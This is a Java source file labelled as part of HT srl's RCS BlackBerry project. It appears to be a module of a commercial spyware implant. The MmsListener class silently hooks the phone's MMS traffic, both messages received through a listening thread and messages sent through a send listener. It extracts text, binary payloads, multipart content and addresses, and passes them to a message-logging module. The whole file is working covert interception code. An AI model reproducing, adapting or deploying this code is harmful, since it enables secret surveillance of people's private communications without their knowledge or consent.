//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.module.mms;

import java.io.IOException;
import java.io.UnsupportedEncodingException;

import javax.microedition.io.Connector;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;
import javax.wireless.messaging.MultipartMessage;
import javax.wireless.messaging.MessagePart;

import blackberry.Singleton;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.iSingleton;
import blackberry.module.ModuleMessage;

import net.rim.blackberry.api.mms.SendListener;
import net.rim.blackberry.api.mms.MMS;

public class MmsListener implements iSingleton, SendListener

{

    //#ifdef DEBUG
    private static Debug debug = new Debug("MmsListener", DebugLevel.VERBOSE);
    //#endif
    private static final long GUID = 0xc0f37ed8a77b8141L;
    private static MmsListener instance;

    private MessageConnection _mc;
    private ListeningThread _listener;

    private boolean _stop = false;

    public synchronized static MmsListener getInstance() {

        if (instance == null) {
            instance = (MmsListener) Singleton.self().get(GUID);
            if (instance == null) {
                final MmsListener singleton = new MmsListener();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    public void start() {
        //#ifdef DEBUG
        debug.trace("start");
        //#endif
        _listener = new ListeningThread();
        _listener.start();
        MMS.addSendListener(this);
    }

    public void stop() {
        //#ifdef DEBUG
        debug.trace("stop");
        //#endif
        _listener.stop();
        _listener = null;
        //#ifdef DEBUG
        debug.trace("stop: remove sendListener");
        //#endif
        MMS.removeSendListener(this);
    }

    private byte[] getMmsDataMessage(
            final javax.wireless.messaging.Message message) {

        byte[] dataMsg = null;

        if (message instanceof TextMessage) {
            //#ifdef DEBUG
            debug.trace("getMmsDataMessage: TextMessage");
            //#endif
            final TextMessage tm = (TextMessage) message;
            final String msg = tm.getPayloadText();
            //#ifdef DEBUG
            debug.info("Got Text MMS: " + msg);
            //#endif

            dataMsg = msg.getBytes();

        } else if (message instanceof BinaryMessage) {
            //#ifdef DEBUG
            debug.trace("getMmsDataMessage: BinaryMessage");
            //#endif
            dataMsg = ((BinaryMessage) message).getPayloadData();

            try {

                //String msg16 = new String(data, "UTF-16BE");
                final String msg8 = new String(dataMsg, "UTF-8");

                //#ifdef DEBUG
                //debug.trace("saveLog msg16:" + msg16);
                debug.trace("saveLog msg8:" + msg8);
                //#endif

            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG
                debug.error("saveLog:" + e);
                //#endif
            }
            //#ifdef DEBUG
            debug.info("Got Binary SMS, len: " + dataMsg.length);
            //#endif
        } else if (message instanceof MultipartMessage) {
            //#ifdef DEBUG
            debug.trace("getMmsDataMessage, MultipartMessage");
            //#endif

            MultipartMessage mm = (MultipartMessage) message;

            String subject = mm.getSubject();
            //String[] addresses= mm.getAddresses();
            MessagePart[] parts = mm.getMessageParts();

            //#ifdef DEBUG
            debug.trace("getMmsDataMessage, subject: " + subject);
            //#endif

            for (int i = 0; i < parts.length; i++) {
                MessagePart part = parts[i];
                //#ifdef DEBUG
                debug.trace("getMmsDataMessage, parts(" + i + ") id: "
                        + part.getContentID() + " mime: " + part.getMIMEType()
                        + " content: " + part.getContent());
                //#endif
            }

        } else {
            //#ifdef DEBUG
            debug.trace("getMmsDataMessage: unknown type: " + message);
            //#endif
        }
        return dataMsg;
    }

    public boolean sendMessage(Message message) {
        //#ifdef DEBUG
        debug.trace("sendMessage");
        //#endif
        return manageMessage(message);
    }

    private boolean manageMessage(Message message) {
        try {
            final byte[] dataMsg = getMmsDataMessage(message);
            String address = message.getAddress();

            ModuleMessage.getInstance().onNewMms(dataMsg, address, true);
            return true;
        } catch (Exception e) {
            //#ifdef DEBUG
            debug.error("sendMessage");
            //#endif

            return false;
        }
    }

    // Inner Classes ------------------------------------------------------------
    private class ListeningThread extends Thread {

        public synchronized void stop() {
            _stop = true;

            try {
                if (_mc != null) {
                    // Close the connection so the thread will return.
                    _mc.close();
                }
            } catch (IOException e) {
                System.err.println(e.toString());
            }
        }

        public void run() {
            try {
                //#ifdef DEBUG

                debug.trace("run");
                //#endif
                _mc = (MessageConnection) Connector.open("mms://:0"); // Closed by the stop() method.

                //DatagramConnection _dc = (DatagramConnection) _mc;
                //#ifdef DEBUG
                debug.trace("mc: " + _mc);
                //#endif
                for (;;) {
                    if (_stop) {
                        //#ifdef DEBUG

                        debug.trace("stop");
                        //#endif
                        return;
                    }
                  //#ifdef DEBUG
                    debug.trace("run: receiving");
                    //#endif
                    Message message = _mc.receive();
                    //#ifdef DEBUG
                    debug.trace("run: received");
                    //#endif
                    manageMessage(message);

                }
            } catch (Exception e) {
                //#ifdef DEBUG
                debug.error("run");
                //#endif
            }
        }
    }
}
